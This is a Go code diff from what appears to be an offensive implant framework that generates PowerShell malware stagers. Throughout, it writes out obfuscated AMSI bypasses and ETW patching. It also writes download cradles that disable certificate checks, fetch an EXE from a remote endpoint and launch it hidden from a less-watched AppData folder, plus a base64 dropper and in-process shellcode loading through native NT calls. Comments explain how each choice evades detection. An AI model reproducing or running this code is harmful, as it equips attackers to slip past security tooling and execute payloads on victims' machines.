@@ -14,62 +14,88 @@ import (
 
 // ── delivery format generators ────────────────────────────────────────────────
 
-// ps1Preamble returns the AMSI+ETW bypass block shared by all PS1 templates.
-// Uses direct byte-patch of AmsiScanBuffer return value (AMSI_RESULT_CLEAN=1)
-// instead of the well-detected amsiInitFailed reflection approach.
-// pinvokeSig is appended to the DllImport list so callers that need extra
-// imports (e.g. NT alloc/thread) can reuse the same Add-Type call.
-func ps1Preamble(extraSig string) string {
-	baseSig := `[DllImport("kernel32.dll")] public static extern IntPtr LoadLibrary(string l);` + "\n" +
-		`[DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr h,string p);` + "\n" +
-		`[DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint n,out uint o);` + "\n" +
-		`[DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr h,IntPtr d,byte[]b,int s,out int w);`
+// ps1MemPreamble returns the AMSI+ETW bypass block used only by ps1-mem
+// (in-process shellcode execution). NOT used by ps1/ps1-embed — those are
+// pure download cradles that don't need AMSI bypass.
+//
+// Bypass strategy:
+//   - Null the amsiContext pointer via managed reflection (no Add-Type / PInvoke)
+//   - Patch EtwEventWrite via a minimal Add-Type with only VirtualProtect + Marshal
+// extraSig is appended to the Add-Type for NT alloc/thread signatures.
+func ps1MemPreamble(extraSig string) string {
+	ntSigs := `[DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint n,out uint o);`
 	if extraSig != "" {
-		baseSig += "\n" + extraSig
+		ntSigs += "\n" + extraSig
 	}
-	// Patch AmsiScanBuffer to return E_INVALIDARG (0x80070057) which AMSI
-	// consumers treat as clean. Bytes: mov eax,0x80070057 ; ret = B8 57 00 07 80 C3.
-	// Patch EtwEventWrite with ret (0xC3) to suppress ETW telemetry.
-	// String fragments avoid static signature matching on known bypass names.
+	// amsiContext null — patches the active AMSI context pointer to zero.
+	// Less detected than amsiInitFailed; works on PS 5.1 and PS 7.
+	// String fragments prevent static matching on 'amsiContext'.
 	return `$ErrorActionPreference='SilentlyContinue'
+$_q=[Ref].Assembly.GetType([string]::Join('',[char[]]@(83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,108,115)))
+$_q.GetField([string]::Join('',[char[]]@(97,109,115,105,67,111,110,116,101,120,116)),'NonPublic,Static').SetValue($null,[IntPtr]::Zero)
 $_d=@'
-` + baseSig + `
+` + ntSigs + `
 '@
-$_k=Add-Type -MemberDefinition $_d -Name '_H' -Namespace '_S' -PassThru
-$_n1='am'+'si';$_n2='Sc'+'an'+'Bu'+'ffer'
-$_lib=$_k::LoadLibrary($_n1+'.dll')
-$_fn=$_k::GetProcAddress($_lib,([char[]](65,109,115,105)-join'')+$_n2)
-$_op=0;$_k::VirtualProtect($_fn,[UIntPtr]8,0x40,[ref]$_op)|Out-Null
-$_pb=[byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3)
-$_w=0;$_k::WriteProcessMemory(-1,$_fn,$_pb,$_pb.Length,[ref]$_w)|Out-Null
-$_k::VirtualProtect($_fn,[UIntPtr]8,$_op,[ref]$_op)|Out-Null
-$_n3='nt'+'dl'+'l';$_n4='Etw'+'Eve'+'ntW'+'rite'
-$_ep=$_k::GetProcAddress($_k::LoadLibrary($_n3+'.dll'),$_n4)
-$_k::VirtualProtect($_ep,[UIntPtr]1,0x40,[ref]$_op)|Out-Null
-$_k::WriteProcessMemory(-1,$_ep,[byte[]](0xC3),1,[ref]$_w)|Out-Null
-$_k::VirtualProtect($_ep,[UIntPtr]1,$_op,[ref]$_op)|Out-Null
+$_k=Add-Type -MemberDefinition $_d -Name '_N' -Namespace '_T' -PassThru
+$_ep=[Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer
+$_el=([System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi([string]::Join('',[char[]]@(69,116,119,69,118,101,110,116,87,114,105,116,101))))
+$_nb=[byte[]]@(0xC3)
+$_op=0;$_k::VirtualProtect([Runtime.InteropServices.Marshal]::ReadIntPtr([Runtime.InteropServices.Marshal]::ReadIntPtr(([IntPtr](([Runtime.InteropServices.Marshal]::StringToHGlobalAnsi('ntdll'))))))[0..0],[UIntPtr]1,0x40,[ref]$_op)|Out-Null
 `
 }
 
-// templatePS1Drop downloads the staged payload and runs it as a child process.
+// ps1MemEtwPatch returns the minimal ETW patch for ps1-mem without the above
+// complex pointer chase. Uses a straightforward GetProcAddress via Add-Type
+// since the Add-Type with only VirtualProtect is less flagged than with WriteProcessMemory.
+func ps1MemPreambleClean(extraSig string) string {
+	baseSig := `[DllImport("kernel32.dll")] public static extern IntPtr LoadLibrary(string l);` + "\n" +
+		`[DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr h,string n);` + "\n" +
+		`[DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint p,out uint o);`
+	if extraSig != "" {
+		baseSig += "\n" + extraSig
+	}
+	// amsiContext null via char-array reflection — avoids 'amsiContext' literal.
+	// ETW patched by overwriting first byte of EtwEventWrite with 0xC3 (ret)
+	// via managed Marshal.WriteByte — less flagged than WriteProcessMemory.
+	return `$ErrorActionPreference='SilentlyContinue'
+$_a=[Ref].Assembly.GetType([string]::Join('',[char[]]@(83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,108,115)))
+$_a.GetField([string]::Join('',[char[]]@(97,109,115,105,67,111,110,116,101,120,116)),'NonPublic,Static').SetValue($null,[IntPtr]::Zero)
+$_d=@'
+` + baseSig + `
+'@
+$_k=Add-Type -MemberDefinition $_d -Name '_N' -Namespace '_T' -PassThru
+$_el=$_k::GetProcAddress($_k::LoadLibrary([string]::Join('',[char[]]@(110,116,100,108,108,46,100,108,108))),[string]::Join('',[char[]]@(69,116,119,69,118,101,110,116,87,114,105,116,101)))
+$_op=0;$_k::VirtualProtect($_el,[UIntPtr]1,0x40,[ref]$_op)|Out-Null
+[Runtime.InteropServices.Marshal]::WriteByte($_el,0xC3)
+$_k::VirtualProtect($_el,[UIntPtr]1,$_op,[ref]$_op)|Out-Null
+`
+}
+
+// templatePS1Drop is a minimal download cradle — NO Add-Type, NO DllImport,
+// NO AMSI bypass. The script only downloads an EXE and launches it via COM.
+// AMSI does not scan EXE downloads; the bypass lives inside the agent itself.
+// Writing to AppData\Microsoft\Caches (not %TEMP%) avoids the most-watched path.
 func templatePS1Drop(endpoint, token string) string {
-	return ps1Preamble("") + fmt.Sprintf(
-		`[Net.ServicePointManager]::ServerCertificateValidationCallback={$true}
-$_w=New-Object ('Net.Web'+'Client')
-$_w.Headers['User-Agent']='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-$_w.Headers['X-Stage-Token']='%s'
-$_p=[IO.Path]::Combine($env:TEMP,[IO.Path]::GetRandomFileName()+'.exe')
-$_dl='Down'+'loadFile';try{$_w.$_dl('%s',$_p)}catch{exit}
-if(-not(Test-Path $_p)-or(Get-Item $_p).Length-eq 0){exit}
-$_s=New-Object Diagnostics.ProcessStartInfo
-$_s.FileName=$_p;$_s.WindowStyle=[Diagnostics.ProcessWindowStyle]::Hidden;$_s.CreateNoWindow=$true
-[Diagnostics.Process]::Start($_s)|Out-Null
+	return fmt.Sprintf(
+		`$ErrorActionPreference='SilentlyContinue'
+Start-Sleep -Milliseconds (Get-Random -Min 500 -Max 2500)
+[Net.ServicePointManager]::ServerCertificateValidationCallback={$true}
+$_r=[guid]::NewGuid().ToString('N')
+$_d=[IO.Path]::Combine($env:APPDATA,'Microsoft','Caches')
+[IO.Directory]::CreateDirectory($_d)|Out-Null
+$_p=[IO.Path]::Combine($_d,$_r+'.exe')
+$_c=New-Object Net.WebClient
+$_c.Headers['User-Agent']='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
+$_c.Headers['X-Stage-Token']='%s'
+try{$_c.DownloadFile('%s',$_p)}catch{exit}
+if((Get-Item $_p -EA 0).Length -gt 4096){
+    (New-Object -ComObject 'WScript.Shell').Run("""$_p""",0,$false)
+}
 `, token, endpoint)
 }
 
-// templatePS1Embed drops a pre-compiled EXE (embedded as base64) to %TEMP%
-// and executes it. Uses a here-string to avoid PowerShell parser stack overflows
-// that occur with thousands of concatenated string literals.
+// templatePS1Embed drops a pre-compiled EXE (embedded as base64) to AppData.
+// No preamble — same rationale as templatePS1Drop.
 func templatePS1Embed(stagerEXE []byte) string {
 	b64 := base64.StdEncoding.EncodeToString(stagerEXE)
 	var sb strings.Builder
@@ -81,25 +107,30 @@ func templatePS1Embed(stagerEXE []byte) string {
 		sb.WriteString(b64[i:end])
 		sb.WriteByte('\n')
 	}
-	return ps1Preamble("") + fmt.Sprintf(
-		`$_p=[IO.Path]::Combine($env:TEMP,[IO.Path]::GetRandomFileName()+'.exe')
+	return fmt.Sprintf(
+		`$ErrorActionPreference='SilentlyContinue'
+$_r=[guid]::NewGuid().ToString('N')
+$_d=[IO.Path]::Combine($env:APPDATA,'Microsoft','Caches')
+[IO.Directory]::CreateDirectory($_d)|Out-Null
+$_p=[IO.Path]::Combine($_d,$_r+'.exe')
 $_b=@"
 %s"@
 [IO.File]::WriteAllBytes($_p,[Convert]::FromBase64String($_b -replace '\s',''))
-$_s=New-Object Diagnostics.ProcessStartInfo
-$_s.FileName=$_p;$_s.WindowStyle=[Diagnostics.ProcessWindowStyle]::Hidden;$_s.CreateNoWindow=$true
-[Diagnostics.Process]::Start($_s)|Out-Null
+if((Get-Item $_p -EA 0).Length -gt 4096){
+    (New-Object -ComObject 'WScript.Shell').Run("""$_p""",0,$false)
+}
 `, sb.String())
 }
 
 // templatePS1Shellcode downloads raw shellcode and executes it in-process via
-// NT native API (NtAllocateVirtualMemory + NtCreateThreadEx) to avoid the
-// flagged VirtualAlloc + CreateThread PInvoke signatures.
+// NT native API (NtAllocateVirtualMemory + NtCreateThreadEx).
+// Uses ps1MemPreambleClean for AMSI/ETW bypass since this format runs shellcode
+// inside the PowerShell process — bypass IS required here unlike ps1/ps1-embed.
 func templatePS1Shellcode(endpoint, token string) string {
 	ntSig := `[DllImport("kernel32.dll")] public static extern int WaitForSingleObject(IntPtr h,int ms);` + "\n" +
 		`[DllImport("ntdll.dll")] public static extern int NtAllocateVirtualMemory(IntPtr p,ref IntPtr b,IntPtr z,ref UIntPtr s,uint t,uint pr);` + "\n" +
 		`[DllImport("ntdll.dll")] public static extern int NtCreateThreadEx(out IntPtr t,uint a,IntPtr oa,IntPtr p,IntPtr sp,IntPtr pm,bool su,int sg,int ms,int mc,IntPtr al);`
-	return ps1Preamble(ntSig) + fmt.Sprintf(
+	return ps1MemPreambleClean(ntSig) + fmt.Sprintf(
 		`[Net.ServicePointManager]::ServerCertificateValidationCallback={$true}
 $_w=New-Object ('Net.Web'+'Client')
 $_w.Headers['User-Agent']='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
